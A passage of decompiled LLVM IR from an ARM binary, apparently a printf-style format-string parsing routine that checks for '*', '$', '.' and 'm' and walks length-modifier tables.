  %v0_10d3c = phi i32 [ %v5_10cbc, %dec_label_pc_10cf8 ], [ %v0_10c34, %bb133 ], [ %v0_10c34, %dec_label_pc_10c8c ], [ %v0_10c34, %dec_label_pc_10c34 ]
  %stack_var_-48.3 = phi i32 [ %stack_var_-48.2, %dec_label_pc_10cf8 ], [ %stack_var_-48.1, %bb133 ], [ %stack_var_-48.1, %dec_label_pc_10c8c ], [ %stack_var_-48.1, %dec_label_pc_10c34 ]
  %v1_10cfc = inttoptr i32 %v0_10d3c to i8*
  %v2_10cfc = load i8, i8* %v1_10cfc, align 1
  %v3_10cfc = zext i8 %v2_10cfc to i32
  store i32 %v3_10cfc, i32* %r3.global-to-local, align 4
  %v7_10d00 = icmp eq i8 %v2_10cfc, 42
  br i1 %v7_10d00, label %dec_label_pc_10d08, label %dec_label_pc_10d4c

dec_label_pc_10d08:                               ; preds = %dec_label_pc_10cfc
  %v0_10d08 = load i32, i32* %sb.global-to-local, align 4
  %v2_10d08 = icmp eq i32 %v0_10d08, 0
  br i1 %v2_10d08, label %dec_label_pc_10d3c, label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %dec_label_pc_10d08
  %v1_10d10 = inttoptr i32 %v1_10d40 to i8*
  %v2_10d10 = load i8, i8* %v1_10d10, align 1
  %v3_10d10 = zext i8 %v2_10d10 to i32
  store i32 %v3_10d10, i32* %r3.global-to-local, align 4
  %v7_10d14 = icmp eq i8 %v2_10d10, 36
  br i1 %v7_10d14, label %dec_label_pc_10d1c, label %dec_label_pc_10fc4

dec_label_pc_10d1c:                               ; preds = %dec_label_pc_10d10
  %v0_10d1c = load i32, i32* %r0.global-to-local, align 4
  %tmp134 = icmp slt i32 %v0_10d1c, 1
  br i1 %tmp134, label %dec_label_pc_10fc4, label %dec_label_pc_10d24

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d1c
  store i32 %v25_10b30, i32* %r1.global-to-local, align 4
  %v0_10d2c = load i32, i32* @lr, align 4
  %v3_10d2c = mul i32 %v0_10d2c, -4
  %v4_10d2c = add i32 %v3_10d2c, %v25_10b30
  store i32 %v4_10d2c, i32* %r3.global-to-local, align 4
  %v1_10d30 = add i32 %v1_10d40, 1
  store i32 %v1_10d30, i32* %r6.global-to-local, align 4
  %v2_10d34 = add i32 %v4_10d2c, -24
  %v3_10d34 = inttoptr i32 %v2_10d34 to i32*
  store i32 %v0_10d1c, i32* %v3_10d34, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d3c:                               ; preds = %dec_label_pc_10d08
  %v1_10d3c = add i32 %v0_10d3c, 1
  store i32 %v1_10d3c, i32* %r3.global-to-local, align 4
  %v9_10d40 = icmp eq i32 %v1_10d3c, %v1_10d40
  br i1 %v9_10d40, label %dec_label_pc_10d48, label %dec_label_pc_10fc4

dec_label_pc_10d48:                               ; preds = %dec_label_pc_10d3c, %dec_label_pc_10d24
  store i32 -2147483648, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10cfc, %dec_label_pc_10d48
  %v0_10d4c = load i32, i32* @lr, align 4
  %v2_10d4c = icmp eq i32 %v0_10d4c, 0
  br i1 %v2_10d4c, label %dec_label_pc_10d54, label %dec_label_pc_10b6c

dec_label_pc_10d54:                               ; preds = %dec_label_pc_10d4c
  %v0_10d54 = load i32, i32* %r6.global-to-local, align 4
  %v1_10d54 = inttoptr i32 %v0_10d54 to i8*
  %v2_10d54 = load i8, i8* %v1_10d54, align 1
  %v3_10d54 = zext i8 %v2_10d54 to i32
  store i32 %v3_10d54, i32* %r3.global-to-local, align 4
  %v7_10d58 = icmp eq i8 %v2_10d54, 46
  br i1 %v7_10d58, label %.thread22, label %dec_label_pc_10d6c

.thread22:                                        ; preds = %dec_label_pc_10d54
  %v2_10d5c = add i32 %v0_10d54, 1
  store i32 %v2_10d5c, i32* %r6.global-to-local, align 4
  %v1_10d60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_10d60, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @lr, align 4
  br label %dec_label_pc_10bd4

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_10d54
  %v0_10d6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10d6c, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10b6c, %dec_label_pc_10d6c
  %v0_10d7c.pre = phi i32 [ %v0_10d54, %dec_label_pc_10d6c ], [ %v0_10d7c.pre.pre, %dec_label_pc_10b6c ]
  %storemerge = phi i32 [ -1, %dec_label_pc_10d6c ], [ %v0_10b6c, %dec_label_pc_10b6c ]
  store i32 %storemerge, i32* @r5, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19f34.365 to i32), i32* %r1.global-to-local, align 4
  %v1_10d7c = inttoptr i32 %v0_10d7c.pre to i8*
  br label %dec_label_pc_10d78

dec_label_pc_10d78:                               ; preds = %dec_label_pc_10d88, %dec_label_pc_10d74
  %v0_10d88 = phi i32 [ %v1_10d88, %dec_label_pc_10d88 ], [ ptrtoint ([9 x i8]* @global_var_19f34.365 to i32), %dec_label_pc_10d74 ]
  %v1_10d78 = inttoptr i32 %v0_10d88 to i8*
  %v2_10d78 = load i8, i8* %v1_10d78, align 1
  %v3_10d78 = zext i8 %v2_10d78 to i32
  store i32 %v3_10d78, i32* %r2.global-to-local, align 4
  %v2_10d7c = load i8, i8* %v1_10d7c, align 1
  %v3_10d7c = zext i8 %v2_10d7c to i32
  store i32 %v3_10d7c, i32* %r3.global-to-local, align 4
  %v9_10d80 = icmp eq i8 %v2_10d7c, %v2_10d78
  br i1 %v9_10d80, label %dec_label_pc_10b74, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d78
  %v1_10d88 = add i32 %v0_10d88, 1
  %v2_10d88 = inttoptr i32 %v1_10d88 to i8*
  %v3_10d88 = load i8, i8* %v2_10d88, align 1
  %v4_10d88 = zext i8 %v3_10d88 to i32
  store i32 %v4_10d88, i32* %r3.global-to-local, align 4
  store i32 %v1_10d88, i32* %r1.global-to-local, align 4
  %v2_10d8c = icmp eq i8 %v3_10d88, 0
  br i1 %v2_10d8c, label %dec_label_pc_10d94, label %dec_label_pc_10d78

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10d88, %dec_label_pc_10b74
  %v1_10db4 = phi i32 [ %v1_10b74, %dec_label_pc_10b74 ], [ %v0_10d7c.pre, %dec_label_pc_10d88 ]
  %v1_10db0 = phi i32 [ %v0_10d88, %dec_label_pc_10b74 ], [ %v1_10d88, %dec_label_pc_10d88 ]
  %v2_10d98 = sub i32 %v1_10db0, ptrtoint ([9 x i8]* @global_var_19f34.365 to i32)
  store i32 %v2_10d98, i32* %r3.global-to-local, align 4
  %v8_10da0 = icmp sgt i32 %v2_10d98, 1
  br i1 %v8_10da0, label %.thread25, label %dec_label_pc_10da4

dec_label_pc_10da4:                               ; preds = %dec_label_pc_10d94
  %v1_10da4 = inttoptr i32 %v1_10db4 to i8*
  %v2_10da4 = load i8, i8* %v1_10da4, align 1
  %v3_10da4 = zext i8 %v2_10da4 to i32
  store i32 %v3_10da4, i32* %r2.global-to-local, align 4
  %v1_10da8 = inttoptr i32 %v1_10db0 to i8*
  %v2_10da8 = load i8, i8* %v1_10da8, align 1
  %v3_10da8 = zext i8 %v2_10da8 to i32
  store i32 %v3_10da8, i32* %r3.global-to-local, align 4
  %v9_10dac = icmp eq i8 %v2_10da4, %v2_10da8
  br i1 %v9_10dac, label %bb135, label %.thread25

bb135:                                            ; preds = %dec_label_pc_10da4
  %v2_10db0 = add i32 %v1_10db0, 9
  store i32 %v2_10db0, i32* %r1.global-to-local, align 4
  %v2_10db4 = add i32 %v1_10db4, 1
  store i32 %v2_10db4, i32* %r6.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_10da4, %dec_label_pc_10d94, %bb135
  %v0_10dbc = phi i32 [ %v1_10db0, %dec_label_pc_10da4 ], [ %v1_10db0, %dec_label_pc_10d94 ], [ %v2_10db0, %bb135 ]
  %v0_10db8 = phi i32 [ %v1_10db4, %dec_label_pc_10da4 ], [ %v1_10db4, %dec_label_pc_10d94 ], [ %v2_10db4, %bb135 ]
  %v1_10db8 = inttoptr i32 %v0_10db8 to i8*
  %v2_10db8 = load i8, i8* %v1_10db8, align 1
  %v3_10db8 = zext i8 %v2_10db8 to i32
  store i32 %v3_10db8, i32* %r2.global-to-local, align 4
  %v1_10dbc = add i32 %v0_10dbc, 9
  %v2_10dbc = inttoptr i32 %v1_10dbc to i8*
  %v3_10dbc = load i8, i8* %v2_10dbc, align 1
  %v4_10dbc = zext i8 %v3_10dbc to i32
  store i32 %v4_10dbc, i32* %r3.global-to-local, align 4
  %v2_10dc0 = icmp eq i8 %v2_10db8, 0
  %v3_10dc4 = mul nuw nsw i32 %v4_10dbc, 256
  store i32 %v3_10dc4, i32* @lr, align 4
  br i1 %v2_10dc0, label %dec_label_pc_10fc4, label %dec_label_pc_10dcc

dec_label_pc_10dcc:                               ; preds = %.thread25
  store i32 ptrtoint ([21 x i8]* @global_var_19f74.367 to i32), i32* %ip.global-to-local, align 4
  %v3_10dd0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_10dd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10dd4

dec_label_pc_10dd4:                               ; preds = %dec_label_pc_10e58, %dec_label_pc_10dcc
  %v1_10de4 = phi i32 [ %v1_10e58, %dec_label_pc_10e58 ], [ ptrtoint ([21 x i8]* @global_var_19f74.367 to i32), %dec_label_pc_10dcc ]
  %v1_10dd4 = inttoptr i32 %v1_10de4 to i8*
  %v2_10dd4 = load i8, i8* %v1_10dd4, align 1
  %v3_10dd4 = zext i8 %v2_10dd4 to i32
  store i32 %v3_10dd4, i32* %r3.global-to-local, align 4
  %v9_10dd8 = icmp eq i8 %v2_10dd4, %v2_10db8
  br i1 %v9_10dd8, label %dec_label_pc_10de0, label %dec_label_pc_10e58

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10dd4
  store i32 ptrtoint ([21 x i8]* @global_var_19f74.367 to i32), i32* %r3.global-to-local, align 4
  %v2_10de4 = sub i32 %v1_10de4, ptrtoint ([21 x i8]* @global_var_19f74.367 to i32)
  store i32 %v2_10de4, i32* %r2.global-to-local, align 4
  %v7_10dec = icmp slt i32 %v2_10de4, 18
  br i1 %v7_10dec, label %bb137, label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10de0
  %v1_10df0 = and i32 %v3_10dc4, 1024
  %v2_10df0 = icmp eq i32 %v1_10df0, 0
  br i1 %v2_10df0, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_10df0
  %v2_10df4 = add i32 %v2_10de4, -2
  store i32 %v2_10df4, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_10de0, %dec_label_pc_10df0, %bb136
  %v0_10df8 = phi i32 [ %v2_10de4, %dec_label_pc_10de0 ], [ %v2_10de4, %dec_label_pc_10df0 ], [ %v2_10df4, %bb136 ]
  %v1_10df8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10df8 = add i32 %v1_10df8, 32
  %v3_10df8 = inttoptr i32 %v2_10df8 to i32*
  store i32 %v0_10df8, i32* %v3_10df8, align 4
  store i32 ptrtoint (i32* @global_var_19f67.369 to i32), i32* %r1.global-to-local, align 4
  %v0_10e04.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10e00

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10e00, %bb137
  %v0_10e00 = phi i32 [ %v1_10e00, %dec_label_pc_10e00 ], [ ptrtoint (i32* @global_var_19f67.369 to i32), %bb137 ]
  %v1_10e00 = add i32 %v0_10e00, 1
  %v2_10e00 = inttoptr i32 %v1_10e00 to i8*
  %v3_10e00 = load i8, i8* %v2_10e00, align 1
  %v4_10e00 = zext i8 %v3_10e00 to i32
  store i32 %v4_10e00, i32* %r3.global-to-local, align 4
  store i32 %v1_10e00, i32* %r1.global-to-local, align 4
  %v8_10e08 = icmp sgt i32 %v0_10e04.pre, %v4_10e00
  br i1 %v8_10e08, label %dec_label_pc_10e00, label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10e00
  store i32 ptrtoint (i32* @global_var_19f58.373 to i32), i32* %r0.global-to-local, align 4
  %v2_10e14 = sub i32 %v1_10e00, ptrtoint (i32* @global_var_19f68.371 to i32)
  %v2_10e18 = mul i32 %v2_10e14, 2
  store i32 %v2_10e18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19f48.375 to i32), i32* %ip.global-to-local, align 4
  %v2_10e20 = add i32 %v2_10e18, ptrtoint (i32* @global_var_19f58.373 to i32)
  store i32 %v2_10e20, i32* %r2.global-to-local, align 4
  %v1_10e24 = add i32 %v2_10e18, add (i32 ptrtoint (i32* @global_var_19f58.373 to i32), i32 1)
  %v2_10e24 = inttoptr i32 %v1_10e24 to i8*
  %v3_10e24 = load i8, i8* %v2_10e24, align 1
  %v4_10e24 = zext i8 %v3_10e24 to i32
  store i32 %v4_10e24, i32* %r1.global-to-local, align 4
  %v2_10e28 = add i32 %v2_10e18, ptrtoint (i32* @global_var_19f48.375 to i32)
  store i32 %v2_10e28, i32* %r2.global-to-local, align 4
  %v3_10e2c = inttoptr i32 %v2_10e20 to i8*
  %v4_10e2c = load i8, i8* %v3_10e2c, align 2
  %v6_10e2c = zext i8 %v4_10e2c to i32
  store i32 %v6_10e2c, i32* %r0.global-to-local, align 4
  %v1_10e30 = add i32 %v2_10e18, add (i32 ptrtoint (i32* @global_var_19f48.375 to i32), i32 1)
  %v2_10e30 = inttoptr i32 %v1_10e30 to i8*
  %v3_10e30 = load i8, i8* %v2_10e30, align 1
  %v4_10e30 = zext i8 %v3_10e30 to i32
  store i32 %v4_10e30, i32* %r2.global-to-local, align 4
  %v3_10e34 = inttoptr i32 %v2_10e28 to i8*
  %v4_10e34 = load i8, i8* %v3_10e34, align 2
  %v6_10e34 = zext i8 %v4_10e34 to i32
  %v3_10e38 = mul nuw i32 %v4_10e24, 16777216
  store i32 %v3_10e38, i32* %r1.global-to-local, align 4
  %v4_10e3c = sdiv i32 %v3_10e38, 65536
  %v5_10e3c = or i32 %v6_10e2c, %v4_10e3c
  %v3_10e40 = mul nuw i32 %v4_10e30, 16777216
  store i32 %v3_10e40, i32* %r2.global-to-local, align 4
  %v4_10e44 = sdiv i32 %v3_10e40, 65536
  %v5_10e44 = or i32 %v6_10e34, %v4_10e44
  store i32 %v5_10e44, i32* %r3.global-to-local, align 4
  %v0_10e48 = load i32, i32* @lr, align 4
  %v2_10e48 = or i32 %v5_10e3c, %v0_10e48
  store i32 ptrtoint ([21 x i8]* @global_var_19f74.367 to i32), i32* %ip.global-to-local, align 4
  %v2_10e50 = and i32 %v2_10e48, %v5_10e44
  store i32 %v2_10e50, i32* %r0.global-to-local, align 4
  %v0_10e6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10e64

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10dd4
  %v1_10e58 = add i32 %v1_10de4, 1
  %v2_10e58 = inttoptr i32 %v1_10e58 to i8*
  %v3_10e58 = load i8, i8* %v2_10e58, align 1
  %v4_10e58 = zext i8 %v3_10e58 to i32
  store i32 %v4_10e58, i32* %r3.global-to-local, align 4
  store i32 %v1_10e58, i32* %ip.global-to-local, align 4
  %v2_10e5c = icmp eq i8 %v3_10e58, 0
  br i1 %v2_10e5c, label %dec_label_pc_10e64, label %dec_label_pc_10dd4

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e58, %dec_label_pc_10e0c
  %v0_10e70 = phi i32 [ %v0_10e48, %dec_label_pc_10e0c ], [ %v3_10dc4, %dec_label_pc_10e58 ]
  %v0_10e6c = phi i32 [ %v0_10e6c.pre, %dec_label_pc_10e0c ], [ %v0_10db8, %dec_label_pc_10e58 ]
  %v0_10e64 = phi i32 [ %v2_10e50, %dec_label_pc_10e0c ], [ %v3_10dd0, %dec_label_pc_10e58 ]
  store i32 %v0_10e64, i32* %stack_var_-36, align 4
  %v0_10e68 = load i32, i32* @r4, align 4
  %v1_10e68 = and i32 %v0_10e68, 4
  %v1_10e6c = inttoptr i32 %v0_10e6c to i8*
  %v2_10e6c = load i8, i8* %v1_10e6c, align 1
  %v3_10e6c = zext i8 %v2_10e6c to i32
  store i32 %v3_10e6c, i32* %r1.global-to-local, align 4
  %v1_10e70 = and i32 %v0_10e70, 3840
  %v1_10e74 = and i32 %v0_10e68, -5
  %v2_10e78 = or i32 %v1_10e74, %v1_10e70
  store i32 %v2_10e78, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %tmp164 = mul nuw nsw i32 %v1_10e68, 4
  %tmp165 = or i32 %tmp164, 32
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  %v1_10e88 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e88 = add i32 %v1_10e88, 12
  %v3_10e88 = inttoptr i32 %v2_10e88 to i32*
  store i32 %v3_10e6c, i32* %v3_10e88, align 4
  %v0_10e8c = load i32, i32* %r7.global-to-local, align 4
  %v1_10e8c = add i32 %v0_10e8c, 4
  %v2_10e8c = inttoptr i32 %v1_10e8c to i32*
  %v3_10e8c = load i32, i32* @r5, align 4
  store i32 %v3_10e8c, i32* %v2_10e8c, align 4
  %v4_10e8c = add i32 %v0_10e8c, 8
  %v5_10e8c = inttoptr i32 %v4_10e8c to i32*
  %v6_10e8c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_10e8c, i32* %v5_10e8c, align 4
  %v0_10e90 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e90 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e90 = add i32 %v1_10e90, 20
  %v3_10e90 = inttoptr i32 %v2_10e90 to i32*
  store i32 %v0_10e90, i32* %v3_10e90, align 4
  %v0_10e94 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e94 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e94 = add i32 %v1_10e94, 16
  %v3_10e94 = inttoptr i32 %v2_10e94 to i32*
  store i32 %v0_10e94, i32* %v3_10e94, align 4
  %v0_10e98 = load i32, i32* %r0.global-to-local, align 4
  %v1_10e98 = load i32, i32* %r7.global-to-local, align 4
  %v2_10e98 = add i32 %v1_10e98, 28
  %v3_10e98 = inttoptr i32 %v2_10e98 to i32*
  store i32 %v0_10e98, i32* %v3_10e98, align 4
  %v0_10e9c = load i32, i32* %ip.global-to-local, align 4
  %v1_10e9c = inttoptr i32 %v0_10e9c to i8*
  %v2_10e9c = load i8, i8* %v1_10e9c, align 1
  %v3_10e9c = zext i8 %v2_10e9c to i32
  store i32 %v3_10e9c, i32* %r2.global-to-local, align 4
  %v2_10ea0 = icmp eq i8 %v2_10e9c, 0
  br i1 %v2_10ea0, label %dec_label_pc_10ea8, label %dec_label_pc_10ec0

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10e64
  %v0_10ea8 = load i32, i32* %r6.global-to-local, align 4
  %v1_10ea8 = inttoptr i32 %v0_10ea8 to i8*
  %v2_10ea8 = load i8, i8* %v1_10ea8, align 1
  %v3_10ea8 = zext i8 %v2_10ea8 to i32
  store i32 %v3_10ea8, i32* %r3.global-to-local, align 4
  %v7_10eac = icmp eq i8 %v2_10ea8, 109
  br i1 %v7_10eac, label %dec_label_pc_10eb4, label %dec_label_pc_10fc4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10ea8
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_10eb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_10eb8 = add i32 %v1_10eb8, 32
  %v3_10eb8 = inttoptr i32 %v2_10eb8 to i32*
  store i32 20, i32* %v3_10eb8, align 4
  %v0_10ebc = load i32, i32* %r2.global-to-local, align 4
  %v1_10ebc = load i32, i32* %r7.global-to-local, align 4
  %v2_10ebc = add i32 %v1_10ebc, 28
  %v3_10ebc = inttoptr i32 %v2_10ebc to i32*
  store i32 %v0_10ebc, i32* %v3_10ebc, align 4
  br label %dec_label_pc_10ec0

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_10eb4
  %v0_10ec0 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_10ec0, 1
  br i1 %tmp141, label %dec_label_pc_10f78, label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10ec0
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10ecc

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10f60, %dec_label_pc_10ec8
  %v8_10ee8 = phi i32 [ 0, %dec_label_pc_10ec8 ], [ %v1_10f64, %dec_label_pc_10f60 ]
  %v7_10ed0 = icmp sgt i32 %v8_10ee8, 2
  br i1 %v7_10ed0, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_10ecc
  store i32 %v25_10b30, i32* %r2.global-to-local, align 4
  %v12_10ed4 = mul i32 %v8_10ee8, 4
  %v13_10ed4 = add i32 %v12_10ed4, %v25_10b30
  store i32 %v13_10ed4, i32* %r3.global-to-local, align 4
  %v9_10ed8 = add i32 %v13_10ed4, -24
  %v10_10ed8 = inttoptr i32 %v9_10ed8 to i32*
  %v11_10ed8 = load i32, i32* %v10_10ed8, align 4
  store i32 %v11_10ed8, i32* %r2.global-to-local, align 4
  %v9_10edc = load i32, i32* %r7.global-to-local, align 4
  %v10_10edc = add i32 %v9_10edc, %v8_10ee8
  store i32 %v10_10edc, i32* %r3.global-to-local, align 4
  %v9_10ee4 = trunc i32 %v11_10ed8 to i8
  %v11_10ee4 = add i32 %v10_10edc, 36
  %v12_10ee4 = inttoptr i32 %v11_10ee4 to i8*
  store i8 %v9_10ee4, i8* %v12_10ee4, align 1
  %v8_10eec = load i32, i32* %r3.global-to-local, align 4
  %v9_10eec = add i32 %v8_10eec, 36
  %v10_10eec = inttoptr i32 %v9_10eec to i8*
  %v11_10eec = load i8, i8* %v10_10eec, align 1
  %v12_10eec = zext i8 %v11_10eec to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_10ecc
  %v10_10ee8 = add i32 %v8_10ee8, %stack_var_-48.3
  store i32 %v10_10ee8, i32* %r3.global-to-local, align 4
  %v9_10ef0 = add i32 %v10_10ee8, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_10f14 = phi i32 [ %v12_10eec, %bb142 ], [ %v9_10ef0, %bb143 ]
  store i32 %v0_10f14, i32* @r2, align 4
  %v1_10ef4 = load i32, i32* %sb.global-to-local, align 4
  %v2_10ef4 = sub i32 %v0_10f14, %v1_10ef4
  %v4_10ef4 = xor i32 %v1_10ef4, %v0_10f14
  %v5_10ef4 = xor i32 %v2_10ef4, %v0_10f14
  %v6_10ef4 = and i32 %v5_10ef4, %v4_10ef4
  %v7_10ef4 = icmp slt i32 %v6_10ef4, 0
  %v8_10ef4 = icmp slt i32 %v2_10ef4, 0
  %v9_10ef4 = icmp eq i32 %v0_10f14, %v1_10ef4
  %v3_10ef8 = xor i1 %v8_10ef4, %v7_10ef4
  %v4_10ef8 = or i1 %v9_10ef4, %v3_10ef8
  br i1 %v4_10ef8, label %dec_label_pc_10f08, label %dec_label_pc_10efc

dec_label_pc_10efc:                               ; preds = %bb144
  %v1_10efc = add i32 %v0_10f14, -9
  %v3_10efc = sub i32 8, %v0_10f14
  %v4_10efc = and i32 %v3_10efc, %v0_10f14
  %v5_10efc = icmp slt i32 %v4_10efc, 0
  %v6_10efc = icmp slt i32 %v1_10efc, 0
  %v7_10efc = icmp eq i32 %v0_10f14, 9
  %v3_10f00 = xor i1 %v6_10efc, %v5_10efc
  %v4_10f00 = or i1 %v7_10efc, %v3_10f00
  br i1 %v4_10f00, label %dec_label_pc_10f04, label %dec_label_pc_10fc4

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10efc
  store i32 %v0_10f14, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %bb144, %dec_label_pc_10f04
  store i32 %v25_10b30, i32* %ip.global-to-local, align 4
  %v1_10f0c = load i32, i32* %r8.global-to-local, align 4
  %v4_10f0c = mul i32 %v1_10f0c, 4
  %v5_10f0c = add i32 %v4_10f0c, %v25_10b30
  store i32 %v5_10f0c, i32* %r3.global-to-local, align 4
  %v1_10f10 = add i32 %v5_10f0c, -12
  %v2_10f10 = inttoptr i32 %v1_10f10 to i32*
  %v3_10f10 = load i32, i32* %v2_10f10, align 4
  store i32 %v3_10f10, i32* %r5.global-to-local, align 4
  %v1_10f14 = add i32 %v0_10f14, -1
  store i32 %v1_10f14, i32* %sl.global-to-local, align 4
  %v0_10f18 = load i32, i32* %r7.global-to-local, align 4
  %v4_10f18 = mul i32 %v1_10f14, 4
  %v5_10f18 = add i32 %v0_10f18, %v4_10f18
  store i32 %v5_10f18, i32* %r3.global-to-local, align 4
  %v7_10f1c = icmp eq i32 %v3_10f10, 8
  %v1_10f20 = add i32 %v5_10f18, 40
  %v2_10f20 = inttoptr i32 %v1_10f20 to i32*
  %v3_10f20 = load i32, i32* %v2_10f20, align 4
  store i32 %v3_10f20, i32* @r0, align 4
  br i1 %v7_10f1c, label %dec_label_pc_10f60, label %dec_label_pc_10f28

dec_label_pc_10f28:                               ; preds = %dec_label_pc_10f08
  %v9_10f28 = icmp eq i32 %v3_10f20, %v3_10f10
  br i1 %v9_10f28, label %dec_label_pc_10f4c, label %bb145

bb145:                                            ; preds = %dec_label_pc_10f28
  %v8_10f2c = icmp eq i32 %v3_10f20, 8
  br i1 %v8_10f2c, label %dec_label_pc_10f4c, label %dec_label_pc_10f34

dec_label_pc_10f34:                               ; preds = %bb145
  %v0_10f34 = call i32 @_promoted_size()
  %v0_10f3c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10f3c, i32* @r0, align 4
  %v0_10f40 = call i32 @_promoted_size()
  store i32 %v0_10f40, i32* %r0.global-to-local, align 4
  %v8_10f48 = icmp sgt i32 %v0_10f34, %v0_10f40
  br i1 %v8_10f48, label %dec_label_pc_10f60, label %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge

dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge:  ; preds = %dec_label_pc_10f34
  %v1_10f50.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10f58.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_10f58.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_10f4c

dec_label_pc_10f4c:                               ; preds = %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge, %dec_label_pc_10f28, %bb145
  %v1_10f58 = phi i32 [ %v1_10f58.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v1_10f14, %dec_label_pc_10f28 ], [ %v1_10f14, %bb145 ]
  %v0_10f58 = phi i32 [ %v0_10f58.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v0_10f18, %dec_label_pc_10f28 ], [ %v0_10f18, %bb145 ]
  %v1_10f50 = phi i32 [ %v1_10f50.pre, %dec_label_pc_10f34.dec_label_pc_10f4c_crit_edge ], [ %v1_10f0c, %dec_label_pc_10f28 ], [ %v1_10f0c, %bb145 ]
  store i32 %v25_10b30, i32* %r1.global-to-local, align 4
  %v4_10f50 = mul i32 %v1_10f50, 4
  %v5_10f50 = add i32 %v4_10f50, %v25_10b30
  store i32 %v5_10f50, i32* %r3.global-to-local, align 4
  %v1_10f54 = add i32 %v5_10f50, -12
  %v2_10f54 = inttoptr i32 %v1_10f54 to i32*
  %v3_10f54 = load i32, i32* %v2_10f54, align 4
  store i32 %v3_10f54, i32* @r2, align 4
  %v4_10f58 = mul i32 %v1_10f58, 4
  %v5_10f58 = add i32 %v4_10f58, %v0_10f58
  store i32 %v5_10f58, i32* %r3.global-to-local, align 4
  %v2_10f5c = add i32 %v5_10f58, 40
  %v3_10f5c = inttoptr i32 %v2_10f5c to i32*
  store i32 %v3_10f54, i32* %v3_10f5c, align 4
  br label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f34, %dec_label_pc_10f08, %dec_label_pc_10f4c
  %v0_10f60 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f60 = add i32 %v0_10f60, 28
  %v2_10f60 = inttoptr i32 %v1_10f60 to i32*
  %v3_10f60 = load i32, i32* %v2_10f60, align 4
  %v0_10f64 = load i32, i32* %r8.global-to-local, align 4
  %v1_10f64 = add i32 %v0_10f64, 1
  store i32 %v1_10f64, i32* %r8.global-to-local, align 4
  %v1_10f68 = add i32 %v3_10f60, 2
  store i32 %v1_10f68, i32* %r3.global-to-local, align 4
  %v6_10f70 = icmp slt i32 %v1_10f64, %v1_10f68
  br i1 %v6_10f70, label %dec_label_pc_10ecc, label %dec_label_pc_10f90

dec_label_pc_10f78:                               ; preds = %dec_label_pc_10ec0
  %v0_10f78 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f78 = add i32 %v0_10f78, 28
  %v2_10f78 = inttoptr i32 %v1_10f78 to i32*
  %v3_10f78 = load i32, i32* %v2_10f78, align 4
  store i32 %v3_10f78, i32* %r2.global-to-local, align 4
  %v0_10f7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10f7c = trunc i32 %v0_10f7c to i8
  %v3_10f7c = add i32 %v0_10f78, 38
  %v4_10f7c = inttoptr i32 %v3_10f7c to i8*
  store i8 %v1_10f7c, i8* %v4_10f7c, align 1
